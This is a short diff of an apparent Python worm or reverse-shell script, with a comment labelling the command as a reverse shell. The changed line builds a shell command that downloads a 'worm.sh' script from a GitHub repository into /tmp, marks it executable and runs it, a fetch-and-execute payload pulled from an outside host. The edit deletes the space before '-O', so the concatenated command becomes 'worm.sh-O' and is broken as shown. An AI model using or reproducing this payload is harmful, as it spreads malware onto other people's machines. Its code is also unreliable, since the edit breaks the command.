@@ -7,7 +7,7 @@ port = int(input("Port: "))
 
 # Reverse shell command
 command = (
-    "wget https://raw.githubusercontent.com/SPRINGPEACHVINH/NT230.P21.ANTT/refs/heads/main/Simpleworm/worm.sh "
+    "wget https://raw.githubusercontent.com/SPRINGPEACHVINH/NT230.P21.ANTT/refs/heads/main/Simpleworm/worm.sh"
     "-O /tmp/worm.sh; sleep 3; chmod +x /tmp/worm.sh; /tmp/worm.sh\n"
 )
 
